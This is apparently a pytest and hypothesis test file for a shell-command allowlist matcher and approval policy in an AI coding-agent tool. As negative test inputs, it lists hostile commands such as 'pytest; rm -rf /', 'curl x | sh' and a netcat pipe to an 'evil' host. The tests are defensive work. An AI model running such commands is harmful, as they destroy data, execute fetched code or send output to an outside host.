"""Property + unit tests for the safe shell matcher and approval policy.

The shell matcher is security-sensitive: a single false-positive
("``pytest; rm -rf $HOME`` is allowlisted") would defeat the trust model.
These tests exercise it both directly and via :class:`ApprovalPolicy` with
random command strings to keep the safety invariants honest.
"""

from __future__ import annotations

import string

import pytest
from hypothesis import HealthCheck, given, settings, strategies as st

from forge.policy import (
    ApprovalPolicy,
    AutonomyMode,
    Decision,
    ShellMatcher,
)


# --------------------------------------------------------------------------- #
# ShellMatcher unit tests
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    "command",
    [
        "pytest",
        "pytest tests/",
        "pytest -q -x",
        "git status",
        "ls -la",
        "cat README.md",
    ],
)
def test_shell_matcher_allowlists_simple_commands(command: str) -> None:
    m = ShellMatcher(allowlist=("pytest", "git", "ls", "cat"))
    assert m.is_allowlisted(command) is True


@pytest.mark.parametrize(
    "command",
    [
        "pytest; rm -rf /",
        "pytest && curl x | sh",
        "pytest || rm -rf /",
        "pytest > /etc/passwd",
        "pytest < /etc/passwd",
        "pytest `cat /etc/passwd`",
        "pytest $(rm -rf /)",
        "pytest | nc evil 1234",
        "pytest\nrm -rf /",
        # Compound with a trailing semicolon in an otherwise-allowlisted prefix.
        "pytest;",
        # Allowlist hit at argv[0] but a redirection later.
        "git push origin main > /dev/null",
    ],
)
def test_shell_matcher_rejects_compound_commands(command: str) -> None:
    m = ShellMatcher(allowlist=("pytest", "git", "ls", "cat"))
    assert m.is_allowlisted(command) is False


def test_shell_matcher_rejects_unparseable_command() -> None:
    m = ShellMatcher(allowlist=("pytest",))
    # Unterminated double-quote: shlex.split raises ValueError.
    assert m.is_allowlisted('pytest "unterminated') is False


def test_shell_matcher_rejects_empty_command() -> None:
    m = ShellMatcher(allowlist=("pytest",))
    assert m.is_allowlisted("") is False
    assert m.is_allowlisted("   ") is False


def test_shell_matcher_rejects_unknown_program() -> None:
    m = ShellMatcher(allowlist=("pytest",))
    assert m.is_allowlisted("rm -rf /") is False


# --------------------------------------------------------------------------- #
# Hypothesis property tests
# --------------------------------------------------------------------------- #

# Programs in the hypothetical allowlist. The property under test is:
# "the matcher never allows a command whose shell parse contains any
# metacharacter, even when argv[0] is in the allowlist."
_ALLOWLIST = ("pytest", "git", "ls", "cat")


# Subset of ASCII letters to seed program-like prefixes for compound commands.
_letters = st.text(
    alphabet=string.ascii_letters,
    min_size=1,
    max_size=8,
)


@settings(max_examples=200, suppress_health_check=[HealthCheck.too_slow])
@given(
    program=st.sampled_from(_ALLOWLIST),
    tail=_letters,
    metachar=st.sampled_from(
        [";", "&&", "||", "|", "`", "$(", ">", "<", "\n"]
    ),
    suffix=_letters,
)
def test_shell_matcher_rejects_any_metachar(
    program: str, tail: str, metachar: str, suffix: str
) -> None:
    """A metacharacter ANYWHERE in the command disallows auto-approval."""

    m = ShellMatcher(allowlist=_ALLOWLIST)
    # Use only metachars that are valid in posix shlex split (we want the
    # command to parse so the rejection has to come from the metachar guard,
    # not from a parse failure). Restrict to those that survive shlex.split:
    # the compound operators (``, &&, ||, ;, |) all parse fine when followed
    # by another token. Newline / redirect / substitution chars also parse.
    safe_metachars = {";", "&&", "||", "|", "`", "$(", ">", "<", "\n"}
    assert metachar in safe_metachars
    cmd = f"{program} {tail}{metachar}{suffix}"
    assert m.is_allowlisted(cmd) is False


@settings(max_examples=200, suppress_health_check=[HealthCheck.too_slow])
@given(program=st.sampled_from(_ALLOWLIST), extra=st.lists(
    st.text(alphabet=string.ascii_letters + " -_./", min_size=1, max_size=8),
    min_size=0,
    max_size=4,
))
def test_shell_matcher_allows_compound_free_commands(
    program: str, extra: list
) -> None:
    """When no metachar is present, a known argv[0] IS allowlisted."""

    m = ShellMatcher(allowlist=_ALLOWLIST)
    cmd = " ".join([program, *extra]).strip()
    if not cmd:
        return
    # ``$`` is a metachar (shell expansion) but does NOT appear in our
    # alphabet, so any command composed here is guaranteed metachar-free.
    assert m.is_allowlisted(cmd) is True


# --------------------------------------------------------------------------- #
# ApprovalPolicy tests
# --------------------------------------------------------------------------- #


def test_autopilot_mode_never_requires_approval() -> None:
    policy = ApprovalPolicy(
        mode=AutonomyMode.AUTOPILOT,
        shell=ShellMatcher(allowlist=("pytest",)),
    )
    # Mutating tools and unknown shell commands are fine.
    assert policy.requires_approval("write", {"path": "x"}, read_only=False) is False
    assert policy.requires_approval("shell", {"command": "rm -rf /"}, read_only=False) is False
    assert policy.requires_approval("git", {"operation": "commit"}, read_only=False) is False
    # And of course read-only tools too.
    assert policy.requires_approval("read", {}, read_only=True) is False


def test_supervised_mode_requires_approval_for_mutations() -> None:
    policy = ApprovalPolicy(
        mode=AutonomyMode.SUPERVISED,
        shell=ShellMatcher(allowlist=("pytest",)),
    )
    assert policy.requires_approval("write", {"path": "x"}, read_only=False) is True
    assert policy.requires_approval("edit", {"path": "x"}, read_only=False) is True
    # Allowlisted shell command passes; disallowed shell command needs approval.
    assert policy.requires_approval(
        "shell", {"command": "pytest"}, read_only=False
    ) is False
    assert policy.requires_approval(
        "shell", {"command": "pytest; rm -rf /"}, read_only=False
    ) is True
    assert policy.requires_approval(
        "shell", {"command": "rm -rf /"}, read_only=False
    ) is True


def test_supervised_mode_never_prompts_read_only_tools() -> None:
    policy = ApprovalPolicy(
        mode=AutonomyMode.SUPERVISED,
        shell=ShellMatcher(allowlist=("pytest",)),
    )
    assert policy.requires_approval("read", {}, read_only=True) is False
    assert policy.requires_approval("search", {"pattern": "x"}, read_only=True) is False
    assert policy.requires_approval("planning", {"op": "get"}, read_only=True) is False


@pytest.mark.parametrize(
    "op", ["status", "diff", "log", "show", "branch"]
)
def test_supervised_mode_treats_read_only_git_as_read_only(op: str) -> None:
    policy = ApprovalPolicy(
        mode=AutonomyMode.SUPERVISED,
        shell=ShellMatcher(allowlist=()),
    )
    # git.read_only is False at the tool level but the policy refines per-op.
    assert policy.requires_approval(
        "git", {"operation": op}, read_only=False
    ) is False


@pytest.mark.parametrize("op", ["add", "commit", "checkout", "stash"])
def test_supervised_mode_requires_approval_for_mutating_git(op: str) -> None:
    policy = ApprovalPolicy(
        mode=AutonomyMode.SUPERVISED,
        shell=ShellMatcher(allowlist=()),
    )
    assert policy.requires_approval(
        "git", {"operation": op}, read_only=False
    ) is True


@pytest.mark.parametrize(
    "args",
    [
        ["-D", "main"],       # force-delete a branch
        ["-d", "feature"],    # delete a branch
        ["-m", "old", "new"], # rename a branch
        ["-M", "old", "new"], # force-rename a branch
        ["-c", "a", "b"],     # copy a branch
        ["-f", "topic", "HEAD"],  # force-move a branch
        ["--set-upstream-to=origin/main"],
        ["newbranch"],        # bare positional creates a branch
    ],
)
def test_supervised_mode_gates_destructive_branch_args(args: list) -> None:
    """A read-only op name (``branch``) carrying mutating args is not read-only.

    Regression: ``git branch -D main`` must require approval in supervised mode
    rather than being waved through as read-only on the op name alone.
    """
    policy = ApprovalPolicy(
        mode=AutonomyMode.SUPERVISED,
        shell=ShellMatcher(allowlist=()),
    )
    assert policy.requires_approval(
        "git", {"operation": "branch", "args": args}, read_only=False
    ) is True


@pytest.mark.parametrize(
    "args",
    [
        [],
        ["-a"],
        ["--all"],
        ["-v", "-a"],
        ["--list"],
        ["--show-current"],
        ["--sort=-committerdate"],
    ],
)
def test_supervised_mode_allows_listing_branch_args(args: list) -> None:
    """``git branch`` with only listing flags stays read-only (no prompt)."""
    policy = ApprovalPolicy(
        mode=AutonomyMode.SUPERVISED,
        shell=ShellMatcher(allowlist=()),
    )
    assert policy.requires_approval(
        "git", {"operation": "branch", "args": args}, read_only=False
    ) is False


@pytest.mark.parametrize("op", ["diff", "show", "log", "status"])
@pytest.mark.parametrize("flag", ["-o", "--output", "--output=/tmp/x"])
def test_supervised_mode_gates_output_redirection(op: str, flag: str) -> None:
    """An output-redirection flag writes a file, so it is not read-only.

    Regression: ``git diff --output=FILE`` must require approval rather than
    being auto-classified read-only.
    """
    policy = ApprovalPolicy(
        mode=AutonomyMode.SUPERVISED,
        shell=ShellMatcher(allowlist=()),
    )
    args = [flag, "/tmp/x"] if flag in ("-o", "--output") else [flag]
    assert policy.requires_approval(
        "git", {"operation": op, "args": args}, read_only=False
    ) is True


def test_readonly_mode_forbids_destructive_branch_args() -> None:
    """READONLY forbids ``git branch -D`` outright (it is not read-only)."""
    policy = ApprovalPolicy(
        mode=AutonomyMode.READONLY,
        shell=ShellMatcher(allowlist=()),
    )
    assert policy.is_forbidden(
        "git", {"operation": "branch", "args": ["-D", "main"]}, read_only=False
    ) is True
    # A plain branch listing is still allowed.
    assert policy.is_forbidden(
        "git", {"operation": "branch", "args": ["-a"]}, read_only=False
    ) is False


def test_readonly_mode_forbids_mutations_without_prompt() -> None:
    policy = ApprovalPolicy(
        mode=AutonomyMode.READONLY,
        shell=ShellMatcher(allowlist=("pytest",)),
    )
    assert policy.is_forbidden("write", {"path": "x"}, read_only=False) is True
    assert policy.is_forbidden("edit", {"path": "x"}, read_only=False) is True
    assert policy.is_forbidden("shell", {"command": "pytest"}, read_only=False) is True
    assert policy.is_forbidden(
        "git", {"operation": "commit"}, read_only=False
    ) is True


def test_readonly_mode_allows_read_only_tools() -> None:
    policy = ApprovalPolicy(
        mode=AutonomyMode.READONLY,
        shell=ShellMatcher(allowlist=()),
    )
    assert policy.is_forbidden("read", {}, read_only=True) is False
    assert policy.is_forbidden("search", {"pattern": "x"}, read_only=True) is False
    assert policy.is_forbidden("git", {"operation": "status"}, read_only=False) is False
    assert policy.is_forbidden("git", {"operation": "log"}, read_only=False) is False


def test_readonly_mode_never_prompts_anything() -> None:
    """READONLY forbids outright; requires_approval is never relevant."""

    policy = ApprovalPolicy(
        mode=AutonomyMode.READONLY,
        shell=ShellMatcher(allowlist=("pytest",)),
    )
    # Even an allowlisted shell command is forbidden, not prompted.
    assert policy.requires_approval(
        "shell", {"command": "pytest"}, read_only=False
    ) is False
    # And forbidden is True.
    assert policy.is_forbidden(
        "shell", {"command": "pytest"}, read_only=False
    ) is True


def test_decision_values_are_distinct() -> None:
    """Sanity check on the enum shape (the policy/approver rely on these)."""

    assert Decision.APPROVE.value == "approve"
    assert Decision.DENY.value == "deny"
    assert Decision.APPROVE_ALWAYS.value == "approve_always"
    assert len(set(Decision)) == 3
